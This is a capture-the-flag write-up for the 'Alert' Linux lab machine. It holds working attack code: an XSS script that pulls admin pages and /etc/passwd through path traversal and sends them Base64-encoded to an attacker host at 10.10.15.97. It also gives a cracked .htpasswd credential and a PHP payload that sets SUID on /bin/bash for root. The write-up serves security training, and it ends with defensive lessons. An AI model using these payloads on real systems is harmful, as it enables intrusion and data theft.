# Alert

**Difficulty:** Easy | **OS:** Linux | **IP:** `10.10.11.43`

## Summary

**Alert** is an easy-difficulty Linux machine. Initial exploitation is achieved by leveraging a Stored XSS vulnerability within the Markdown preview functionality. By exfiltrating data via the administrator bot through the contact form, we discover a **Local File Inclusion (LFI)** vulnerability in the message management functionality. This allows us to read the `.htpasswd` file located under the `statistics.alert.htb` subdomain and crack the hash to retrieve SSH credentials for the user `albert`.

Privilege escalation is performed by abusing a local monitoring service (`website-monitor`) to which we have write access due to membership in the `management` group. Using Port Forwarding and injecting a custom PHP script into the monitoring path, we grant SUID permissions to `/bin/bash` to gain full `root` access.

## Reconnaissance

### Port Scanning (Nmap)

We begin by enumerating open ports and services on the target machine:

```
nmap -p22,80 -sCV 10.10.11.43
```

_Ports:_
- **22:** SSH (OpenSSH)
- **80:** HTTP (Apache http)

### Virtual Host Routing

When attempting to access the target IP on port 80, the application redirects. To resolve the domain correctly, we add an entry to our `/etc/hosts` file:

```
echo "10.10.11.43 alert.htb" >> /etc/hosts
```

The web application is a **Markdown Viewer** featuring the following sections:
- **Contact Us:** Allows sending a message to the site administrator.
- **About Us:** Provides information about the service.
- **Donate:** Donation page.

### Subdomain Enumeration
We scan for subdomains/vhosts using `gobuster`:

```
gobuster vhost -u http://alert.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain -t 100
```

**Result:** The subdomain statistics.alert.htb is identified. Accessing this subdomain prompts HTTP Basic Authentication. We add it to our /etc/hosts file:

```
echo "10.10.11.43 statistics.alert.htb" >> /etc/hosts
```

## Exploitation (User Flag)

### Identifying Stored XSS
The application allows rendering Markdown and HTML previews. We test a basic payload to confirm XSS execution:

`<script>alert(0);</script>`

When rendered, the pop-up script executes 0, confirming a Stored XSS vulnerability.

**Data Exfiltration via XSS / LFI**
Since the **Contact Us** form triggers an administrative bot to view submitted messages/links, we host a payload on our attacker machine (`pwn.js`) to exfiltrate the HTML source of the admin's page (`index.php?page=messages`):
1) Payload submitted via Contact Us form:

   ```
    <script src="http://10.10.15.97/pwn.js"></script>
    ```
   
3) Contents of `pwn.js` hosted on our HTTP server:

   ```
     var req = new XMLHttpRequest();
    req.open('GET', 'http://alert.htb/index.php?page=messages', false);
    req.send();
    
    var exfil = new XMLHttpRequest();
    exfil.open('GET', 'http://10.10.15.97/?b64=' + btoa(req.responseText), false);
    exfil.send();
     ```
   
We receive a Base64-encoded response. Upon decoding, we reveal the DOM rendered for the administrator:

```
<div class="container">
<h1>Messages</h1>
<ul><li><a href='messages.php?file=2024-03-10_15-48-34.txt'>2024-03-10_15-48-34.txt</a></li></ul>
</div>
```

Messages are loaded using the `file=` parameter in `messages.php`. We check for **Path Traversal / Local File Inclusion (LFI)** by modifying `pwn.js` to target `/etc/passwd`:

```
var req = new XMLHttpRequest();
req.open('GET', 'http://alert.htb/messages.php?file=../../../../../../../../../../etc/passwd', false);
req.send();
	
var exfil = new XMLHttpRequest();
exfil.open('GET', 'http://10.10.15.97/?b64=' + btoa(req.responseText), false);
exfil.send();
```

We successfully retrieve `/etc/passwd`, identifying two user accounts with interactive shells: _albert_ and _david_.

### Reading Configuration Files and Credentials
Next, we inspect the Apache configuration file `/etc/apache2/sites-available/000-default.conf` using the LFI flaw:

```
var req = new XMLHttpRequest();
req.open('GET', 'http://alert.htb/messages.php?file=../../../../../../../../../../etc/apache2/sites-available/000-default.conf', false);
req.send();
// ... exfiltration
```

Relevant VHost configuration retrieved:

```
<VirtualHost *:80>
    ServerName statistics.alert.htb
    DocumentRoot /var/www/statistics.alert.htb
    <Directory /var/www/statistics.alert.htb>
        AuthType Basic
        AuthName "Restricted Area"
        AuthUserFile /var/www/statistics.alert.htb/.htpasswd
        Require valid-user
    </Directory>
</VirtualHost>
```

We then exfiltrate the `.htpasswd` file located at `/var/www/statistics.alert.htb/.htpasswd`:
`albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/`

### Hash Cracking and SSH Access
We save the hash locally and crack it using `hashcat`:

```
hashcat -m 1600 hash /usr/share/wordlists/rockyou.txt
```

Cracked Credentials: `albert` : `manchesterunited`

Using these credentials, we log in via SSH and capture `user.txt`:

```ssh albert@10.10.11.43```

## Privilege Escalation (Root Flag)
### Group and Permission Enumeration
We check the group memberships for the user `albert`:

```# uid=1000(albert) gid=1000(albert) groups=1000(albert),1001(management)```

We search for files and directories associated with the `management` group:

```find / -group management 2>/dev/null```

Discovered Paths:
- `/opt/website-monitor/config`
- `/opt/website-monitor/config/configuration.php`

### Port Forwarding and Local Service Analysis
Enumerating ports listening strictly on the local interface (`127.0.0.1`):

```ss -nltp```

We observe an internal service bound to port `8080`. We forward this port to our local system using SSH (_Local Port Forwarding_):

```ssh albert@10.10.11.43 -L 8080:127.0.0.1:8080```

Navigating to `http://localhost:8080` loads an internal website monitoring portal.

### Abusing Website-Monitor for SUID Bash
Since we possess write permissions in the monitoring path (such as `/opt/website-monitor/monitors`), we create a PHP script that sets the SUID bit on `/bin/bash`:

```<?php system("chmod u+s /bin/bash"); ?>```

When the internal service (running under `root` privileges) processes or executes this file, it sets the SUID bit on the bash executable.

Finally, we spawn a privileged shell to obtain elevated access:

```
ls -la /bin/bash
# -rwsr-xr-x 1 root root ... /bin/bash

bash -p
```

We are now `root` and can read `root.txt`!

## Conclusions & Key Lessons
- **Sanitization in Renderers:** Markdown viewers must strictly sanitize output HTML to prevent Stored XSS execution.
- **Path Traversal Controls:** File handling functions taking user input must validate and canonicalize paths to prevent LFI / Path Traversal.
- **Securing Sensitive Files:** Authentication storage files such as `.htpasswd` should reside outside the web root or be strictly restricted via web server configuration directives.
- **Principle of Least Privilege:** System processes running as root should not execute files from directories writable by non-privileged groups.
